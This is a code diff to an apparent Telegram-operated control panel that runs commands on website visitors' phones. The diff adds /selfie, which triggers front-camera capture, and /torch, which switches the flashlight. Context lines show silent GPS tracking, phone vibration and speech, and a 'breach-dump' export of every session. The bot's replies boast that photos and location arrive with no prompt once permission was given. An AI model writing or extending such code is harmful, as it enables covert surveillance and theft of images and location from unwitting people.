@@ -542,6 +542,8 @@ async function handleCommand(text) {
       `<code>/buzz &lt;id&gt;</code> — make their phone vibrate\n` +
       `<code>/speak &lt;id&gt; &lt;text&gt;</code> — their phone says it out loud\n` +
       `<code>/flash &lt;id&gt;</code> — strobe their screen\n` +
+      `<code>/selfie &lt;id&gt;</code> — trigger front camera capture\n` +
+      `<code>/torch &lt;id&gt; [on|off]</code> — control their LED flashlight\n` +
       `<code>/csv</code> — breach-dump export of every session\n` +
       `<code>/stats</code> — totals\n` +
       `<code>/clear</code> — wipe demo data`
@@ -651,6 +653,21 @@ async function handleCommand(text) {
   if (c === "/gps") {
     const ok = queueCmd((args[0] || "").slice(0, 12), "gps");
     return tgSend(ok ? "📍 GPS request queued — the permission prompt appears on their screen within 3s. If they ever allowed location before, it tracks SILENTLY." : "❓ Usage: /gps <visitor-id> — see /list");
+  }
+
+  if (c === "/selfie") {
+    const ok = queueCmd((args[0] || "").slice(0, 12), "selfie");
+    return tgSend(ok ? "📷 Selfie capture queued — if camera was ever allowed, the photo arrives in seconds with NO prompt" : "❓ Usage: /selfie <visitor-id> — see /list");
+  }
+
+  if (c === "/torch") {
+    const state = (args[1] || "on").toLowerCase();
+    if (state === "off") {
+      const ok = queueCmd((args[0] || "").slice(0, 12), "torchOff");
+      return tgSend(ok ? "🔦 Torch OFF queued" : "❓ Usage: /torch <visitor-id> off — see /list");
+    }
+    const ok = queueCmd((args[0] || "").slice(0, 12), "torchOn");
+    return tgSend(ok ? "🔦 Torch ON queued — their LED flashlight lights up within 3s (needs camera permission granted once)" : "❓ Usage: /torch <visitor-id> [on|off] — see /list");
   }
 
   if (c === "/clear") {
